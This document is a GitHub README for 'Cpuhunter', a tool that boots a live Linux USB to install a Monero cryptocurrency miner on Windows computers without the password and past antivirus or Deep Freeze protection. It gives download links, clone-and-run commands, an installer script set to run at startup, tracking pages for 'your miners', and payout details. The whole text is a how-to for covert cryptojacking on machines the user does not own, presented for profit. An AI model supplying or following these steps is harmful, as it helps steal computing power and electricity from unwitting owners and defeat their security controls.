# Cpuhunter 

[Türkçe için buraya tıklayın](https://github.com/lukacci/cpuhunter/blob/master/README_tr.md)

![Usb live linux 2 windows monero miner](https://image.ibb.co/gPWncJ/usb_linux_100672302_primary_idge.jpg)

Convert any pc to money machine even you don't have the password or deepfreeze/antivirus installed. 

Let the computers works for you. 

# Requirements

* Monero wallet address (You can get it easily from [Mymonero.com](https://mymonero.com)). 
* Usb drive. 

# Installation 

There are 2 options for installation. 

# 1- Burn img file to usb (easy) (torrent)

Download [Cpuhunter Os img file ](https://yadi.sk/d/dNN415il3Yse5h) and burn to a usb drive with [Win32 Disk Imager](https://sourceforge.net/projects/win32diskimager/l) 
Than boot your pc from usb and write the command below to linux terminal:
```
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

Thats it!

For first use you must type your monero wallet to config.json. After that processes will be handled automatically. 


# 2- Install to your own bootable linux usb (for professionals)  


### Install:
```
sudo apt-get install python3 geany
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

### Run:
```
python3 /$USER/cpuhunter/exeinstaller.py
```

Put the run command to startup for automatic processing. 

# Statics Pages

### Online computers list

Your miners will be visible here about 15 mins
```
reed171.com/h.aspx?wallet=your_monero_address
```
### Nanopool control panel

Your miners  will be visible here about 40 mins
```
xmr.nanopool.org/account/your_monero_address
```

 [sample report](https://xmr.nanopool.org/account/46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S)

Screenshots
==================
### Hashsrate statics:
![](https://image.ibb.co/mSdKWd/hashrateler.png)

### Workers:
![](https://image.ibb.co/h0L54y/ornek_kullanim.png)


# Getting the payments
 Your earnings will be sent to [mymonero.com](https://mymonero.com) wallet when you have 1 xmr. 
 You can convert to btc or usd when you want. 

# Additonal notes
* Important: Nanopool shows statics after get the successfull hashrate so your workers stats may have some delays to show. 
* Auto update feature is enabled by default. 
* Developer comission is 1%.  
* Worker id's are created automatically.  
* You can understand process works successfull when "+" signal is appeared on the top-right corner. 
* <strike>Copy files to run folder you want to open on startup.</strike> (Pro Function)
* If you want to remove the software from pc open linux terminal and run the command below:
```
python3 /$USER/cpuhunter/exeinstaller.py remove_all
```


  
  
